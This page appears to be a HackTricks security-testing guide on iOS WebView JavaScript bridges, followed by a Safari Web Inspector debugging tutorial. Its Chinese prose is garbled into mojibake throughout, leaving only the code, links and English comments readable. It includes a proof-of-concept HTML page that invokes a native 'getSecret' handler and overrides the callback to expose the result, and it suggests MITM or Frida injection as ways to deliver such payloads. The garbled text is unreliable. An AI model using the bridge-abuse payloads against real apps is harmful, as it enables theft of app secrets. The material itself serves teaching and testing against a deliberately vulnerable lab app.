åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œé€šè¿‡æ·»åŠ ä¸€ä¸ªåä¸º`"name"`ï¼ˆæˆ–è€…åœ¨ç¤ºä¾‹ä¸­ä¸º`"javaScriptBridge"`ï¼‰çš„è„šæœ¬æ¶ˆæ¯å¤„ç†ç¨‹åºï¼Œä¼šå¯¼è‡´åœ¨ä½¿ç”¨ç”¨æˆ·å†…å®¹æ§åˆ¶å™¨çš„æ‰€æœ‰Webè§†å›¾çš„æ‰€æœ‰æ¡†æ¶ä¸­å®šä¹‰JavaScriptå‡½æ•°`window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage`ã€‚ç„¶åå¯ä»¥é€šè¿‡[ä»¥ä¸‹æ–¹å¼ä»HTMLæ–‡ä»¶ä¸­ä½¿ç”¨å®ƒ](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33)ï¼š
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}
//After testing the previos funtion I got the error TypeError: undefined is not an object (evaluating 'window.webkit.messageHandlers')
//But the following code worked to call the exposed javascriptbridge with the args "addNumbers", "1", "2"

document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
ä¸€æ—¦æ‰§è¡Œæœ¬åœ°å‡½æ•°ï¼Œé€šå¸¸ä¼šåœ¨ç½‘é¡µå†…éƒ¨æ‰§è¡Œä¸€äº›JavaScriptï¼ˆå‚è§ä¸‹é¢çš„`evaluateJavascript`ï¼‰ï¼Œæ‚¨å¯èƒ½ä¼šå¯¹è¦æ‰§è¡Œçš„å‡½æ•°è¿›è¡Œ**è¦†ç›–**ä»¥**çªƒå–ç»“æœ**æ„Ÿå…´è¶£ã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸‹é¢çš„è„šæœ¬ä¸­ï¼Œå°†ä½¿ç”¨ä¸¤ä¸ªå‚æ•°ï¼ˆè¢«è°ƒç”¨çš„å‡½æ•°å’Œ**ç»“æœ**ï¼‰æ‰§è¡Œå‡½æ•°**`javascriptBridgeCallBack`**ã€‚å¦‚æœæ‚¨æ§åˆ¶å°†è¦åŠ è½½çš„HTMLï¼Œæ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªå¸¦æœ‰ç»“æœçš„**è­¦æŠ¥**ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```markup
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
### è°ƒç”¨çš„å‡½æ•°

è°ƒç”¨çš„å‡½æ•°ä½äº[`JavaScriptBridgeMessageHandler.swift`](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29)æ–‡ä»¶ä¸­ï¼š
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
```
### æµ‹è¯•

ä¸ºäº†æµ‹è¯•åœ¨åº”ç”¨ç¨‹åºä¸­å‘é€postMessageï¼Œæ‚¨å¯ä»¥ï¼š

* æ›´æ”¹æœåŠ¡å™¨çš„å“åº”ï¼ˆä¸­é—´äººæ”»å‡»ï¼‰
* ä½¿ç”¨Fridaç­‰æ¡†æ¶æ‰§è¡ŒåŠ¨æ€æ’è£…ï¼Œå¹¶é€šè¿‡ä½¿ç”¨iOS WebViewsçš„ç›¸åº”JavaScriptè¯„ä¼°å‡½æ•°æ³¨å…¥JavaScriptè´Ÿè½½ï¼ˆ`UIWebView`çš„[`stringByEvaluatingJavaScriptFromStringï¼š`](https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc)å’Œ`WKWebView`çš„[`evaluateJavaScriptï¼šcompletionHandlerï¼š`](https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc)ï¼‰ã€‚

## è°ƒè¯•iOS WebViews

ï¼ˆæ¥è‡ª[https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews)çš„æ•™ç¨‹ï¼‰

åœ¨iOSçš„WebViewsä¸­ï¼Œä¼ é€’ç»™`console.log()`çš„æ¶ˆæ¯ä¸ä¼šæ‰“å°åˆ°Xcodeæ—¥å¿—ä¸­ã€‚ä½¿ç”¨Safariçš„å¼€å‘è€…å·¥å…·ä»ç„¶ç›¸å¯¹å®¹æ˜“è°ƒè¯•Webå†…å®¹ï¼Œå°½ç®¡æœ‰ä¸€äº›é™åˆ¶ï¼š

* è°ƒè¯•iOSçš„WebViewséœ€è¦Safariï¼Œå› æ­¤æ‚¨çš„å¼€å‘è®¡ç®—æœºå¿…é¡»è¿è¡ŒmacOSã€‚
* æ‚¨åªèƒ½è°ƒè¯•é€šè¿‡XcodeåŠ è½½åˆ°è®¾å¤‡ä¸Šçš„åº”ç”¨ç¨‹åºä¸­çš„WebViewsã€‚æ‚¨æ— æ³•è°ƒè¯•é€šè¿‡App Storeæˆ–Apple Configuratorå®‰è£…çš„åº”ç”¨ç¨‹åºä¸­çš„WebViewsã€‚

åœ¨è€ƒè™‘åˆ°è¿™äº›é™åˆ¶çš„æƒ…å†µä¸‹ï¼Œä»¥ä¸‹æ˜¯è¿œç¨‹è°ƒè¯•iOSä¸­WebViewsçš„æ­¥éª¤ï¼š

* é¦–å…ˆï¼Œåœ¨iOSè®¾å¤‡ä¸Šæ‰“å¼€iOSçš„_Settings_åº”ç”¨ç¨‹åºï¼Œå¯¼èˆªåˆ°**Settings > Safari > Advanced**ï¼Œå¹¶åˆ‡æ¢æ‰“å¼€_Web Inspector_é€‰é¡¹ã€‚

![iOS Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/ios-safari-settings.jpg)

* æ¥ä¸‹æ¥ï¼Œæ‚¨è¿˜å¿…é¡»åœ¨å¼€å‘è®¡ç®—æœºä¸Šçš„Safariä¸­å¯ç”¨å¼€å‘è€…å·¥å…·ã€‚åœ¨å¼€å‘è®¡ç®—æœºä¸Šå¯åŠ¨Safariå¹¶å¯¼èˆªåˆ°èœå•æ ä¸­çš„**Safari > Preferences**ã€‚åœ¨å‡ºç°çš„é¦–é€‰é¡¹çª—æ ¼ä¸­ï¼Œç‚¹å‡»åº•éƒ¨çš„_Advanced_é€‰é¡¹å¡ï¼Œç„¶åå¯ç”¨åº•éƒ¨çš„_Show Develop menu_é€‰é¡¹ã€‚å®Œæˆåï¼Œå¯ä»¥å…³é—­é¦–é€‰é¡¹çª—æ ¼ã€‚

![Mac Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-settings.jpg)

* å°†iOSè®¾å¤‡è¿æ¥åˆ°å¼€å‘è®¡ç®—æœºå¹¶å¯åŠ¨æ‚¨çš„åº”ç”¨ç¨‹åºã€‚
* åœ¨å¼€å‘è®¡ç®—æœºä¸Šçš„Safariä¸­ï¼Œç‚¹å‡»èœå•æ ä¸­çš„_Develop_ï¼Œç„¶åå°†é¼ æ ‡æ‚¬åœåœ¨ä¸‹æ‹‰é€‰é¡¹ä¸Šï¼Œæ˜¾ç¤ºåœ¨iOSè®¾å¤‡ä¸Šè¿è¡Œçš„WebViewså®ä¾‹çš„åˆ—è¡¨ã€‚

![Mac Safari develop menu](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-develop-menu.jpg)

* å•å‡»è¦è°ƒè¯•çš„WebViewsçš„ä¸‹æ‹‰é€‰é¡¹ã€‚è¿™å°†æ‰“å¼€ä¸€ä¸ªæ–°çš„Safari Web Inspectorçª—å£ï¼Œç”¨äºæ£€æŸ¥WebViewsã€‚

![Safari Web Inspector window](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-inspector.jpg)

## å‚è€ƒèµ„æ–™

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTricksè¡£ç‰©**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
